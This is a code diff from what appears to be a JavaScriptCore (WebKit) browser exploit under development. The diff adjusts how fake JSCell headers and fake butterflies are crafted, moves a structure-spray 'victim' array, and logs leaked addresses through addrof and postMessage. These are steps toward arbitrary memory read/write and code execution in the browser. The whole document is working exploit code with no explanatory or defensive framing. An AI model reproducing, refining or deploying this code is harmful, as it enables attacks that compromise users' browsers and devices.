@@ -413,7 +413,7 @@ var VM_PROT_EXECUTE = 0x4
           }
           // the structure ID is wrong, but we'll fix it :)
           //let doubleArrayCellHeader = new Int64(0x0108230700000000).asJSValue();
-          let doubleArrayCellHeader = new Int64("0x0108230700001000");
+          let doubleArrayCellHeader = new Int64("0x0108230700000000").asJSValue();
           let f = new Float64Array(1);
           let u = new Uint32Array(f.buffer);
           function float2bigint(v,set) {
@@ -494,10 +494,19 @@ var VM_PROT_EXECUTE = 0x4
               return b1[0];
             }
             let obj = {
-              jsCellHeader: new Int64(doubleArrayCellHeader).asDouble(),
+              jsCellHeader: doubleArrayCellHeader,
               fakeButterfly: a0
             };
             let addr = addrof(obj);
+              var structs = []
+              var i = 0;
+              var abc = [13.37];
+              abc.pointer = 1234;
+              abc['prop' + i] = 13.37;
+              structs.push(abc);
+              var victim = structs[0];
+              port.postMessage("victim @ " + addrof(victim).toString());
+              
             /*port.postMessage("obj @ " + addr.toString());
             port.postMessage("arr @ " + addrof([]).toString());
             port.postMessage(typeof(addr) +"vs"+typeof(0x10))
@@ -555,18 +564,18 @@ var VM_PROT_EXECUTE = 0x4
     //
     // and the payload still work stablely. It seems this action is redundant
     
-              var structs = [];
+              /*var structs = [];
               var i = 0;
               var abc = [13.37];
               abc.pointer = 1234;
               abc['prop' + i] = 13.37;
               structs.push(abc);
-              var victim = structs[0x800];
+              var victim = structs[0x800];*/
 
     // take an array from somewhere in the middle so it is preceeded by non-null bytes which
     // will later be treated as the butterfly length.
     
-    port.postMessage("[+] victim @ "+ addrof(victim).toString());
+    //port.postMessage("[+] victim @ "+ addrof(victim).toString());
 
     // craft a fake object to modify victim
     var flags_double_array = new Int64("0x0108200700001000").asJSValue();
